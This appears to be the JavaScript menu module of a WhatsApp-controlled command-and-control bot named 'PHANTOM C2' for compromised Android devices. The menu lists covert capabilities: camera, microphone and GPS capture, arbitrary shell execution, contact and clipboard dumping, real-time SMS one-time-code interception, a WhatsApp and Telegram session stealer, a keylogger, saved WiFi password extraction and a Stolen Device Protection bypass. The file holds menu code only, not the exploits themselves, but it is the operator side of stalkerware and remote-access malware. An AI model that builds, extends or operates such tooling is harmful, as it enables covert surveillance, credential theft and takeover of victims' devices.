export default {
  name: 'menu',
  commands: ['menu', 'help', 'start'],
  handler: async (ctx) => {
    const { sock, jid, getDevices, getTarget } = ctx;
    const devices = getDevices();
    const target = getTarget(jid);
    const targetDevice = target ? devices.find(d => d.device_id === target) : null;
    const status = targetDevice ? (targetDevice.is_online ? '🟢' : '🔴') : '📢';

    const header = target
      ? `🎯 *${target}* ${status}`
      : `📢 *Broadcast Mode*`;

    await sock.sendMessage(jid, {
      text: `╔══════════════════════════╗\n║   🤖 *PHANTOM C2*       ║\n║   ⚡ *6-Proof System*    ║\n╚══════════════════════════╝\n\n${header}\n📶 Transport: WhatsApp\n\n━━━━━━━━━━━━━━━━━━━━━\nSelect a category below:`,
      footer: 'Tap to browse commands',
      title: '☰ COMMAND CENTER',
      buttonText: '📋 OPEN MENU',
      sections: [
        {
          title: '📱 DEVICE CONTROL',
          rows: [
            { title: '📸 Screenshot', description: 'Capture device screen', rowId: 'screenshot' },
            { title: '📍 GPS', description: 'Get device location', rowId: 'gps' },
            { title: '📷 Camera', description: 'Take photo (front/back)', rowId: 'camera' },
            { title: '🎙️ Microphone', description: 'Record audio', rowId: 'mic' },
          ]
        },
        {
          title: '💻 SHELL & COMMANDS',
          rows: [
            { title: '💻 Shell <cmd>', description: 'Execute any shell command', rowId: 'shell' },
            { title: '🐍 Python <code>', description: 'Run Python code', rowId: 'python' },
            { title: '📋 Clipboard', description: 'Read device clipboard', rowId: 'clipboard' },
            { title: '🔔 Notification', description: 'Push notification to device', rowId: 'notification' },
          ]
        },
        {
          title: '🔍 INFORMATION',
          rows: [
            { title: '🌐 IP Info', description: 'Device network info', rowId: 'ip' },
            { title: '⚙️ Sysinfo', description: 'Full system information', rowId: 'sysinfo' },
            { title: '📱 Installed Apps', description: 'List installed packages', rowId: 'installed' },
            { title: '📇 Contacts', description: 'Dump device contacts', rowId: 'contacts' },
            { title: '📡 WiFi', description: 'WiFi networks & info', rowId: 'wifi' },
          ]
        },
        {
          title: '📁 FILES & MEDIA',
          rows: [
            { title: '📂 Files <path>', description: 'List directory contents', rowId: 'files' },
            { title: '⬇️ Download <url>', description: 'Download file to device', rowId: 'download' },
            { title: '⬆️ Upload <path>', description: 'Upload file from device', rowId: 'upload' },
            { title: '📸 Images', description: 'Browse device images', rowId: 'images' },
          ]
        },
        {
          title: '🤖 AI ASSISTANT',
          rows: [
            { title: '🧠 GPT <prompt>', description: 'Chat with AI', rowId: 'gpt' },
            { title: '🎨 Imagine <prompt>', description: 'Generate AI image', rowId: 'imagine' },
          ]
        },
        {
          title: '🎮 FUN & TRICKS',
          rows: [
            { title: '👨‍💻 Hack <name>', description: 'Simulate hacking target', rowId: 'hack' },
            { title: '🕵️ IP Lookup <ip>', description: 'HackIP — trace anyone', rowId: 'hackip' },
            { title: '🆔 FakeInfo', description: 'Generate fake identity', rowId: 'fakeinfo' },
            { title: '😂 Joke', description: 'Random funny joke', rowId: 'joke' },
            { title: '🎱 8Ball <question>', description: 'Ask the magic 8-ball', rowId: '8ball' },
            { title: '🎲 Dice', description: 'Roll a dice', rowId: 'dice' },
          ]
        },
        {
          title: '💉 EXPLOITS',
          rows: [
            { title: '🤖 AutoPwn', description: 'Auto-detect + exploit everything', rowId: 'auto_pwn' },
            { title: '💉 Exploit List', description: 'Show available exploits', rowId: 'exploit_list' },
            { title: '🛡️ SDP Bypass', description: 'Android 15 Stolen Device Protection', rowId: 'sdp_bypass' },
            { title: '🔑 OTP Grabber', description: 'Real-time SMS code interception', rowId: 'otp_grabber' },
            { title: '📡 WiFi Passwords', description: 'Extract saved WiFi passwords', rowId: 'wifi_extractor' },
            { title: '🔓 Session Stealer', description: 'Steal WA/Telegram session (root)', rowId: 'session_stealer' },
            { title: '⌨️ Keylogger', description: 'Accessibility keylogger', rowId: 'keylogger' },
            { title: '📱 ADB over WiFi', description: 'Enable remote ADB', rowId: 'adb_wifi' },
          ]
        },
        {
          title: '⚙️ MANAGEMENT',
          rows: [
            { title: '📱 Devices', description: 'List all registered devices', rowId: 'devices' },
            { title: '🎯 Target <id>', description: 'Set active target', rowId: 'target' },
            { title: '📢 Untarget', description: 'Switch to broadcast mode', rowId: 'untarget' },
            { title: '📊 Status', description: 'Bot health & stats', rowId: 'status' },
          ]
        }
      ]
    });
  }
};
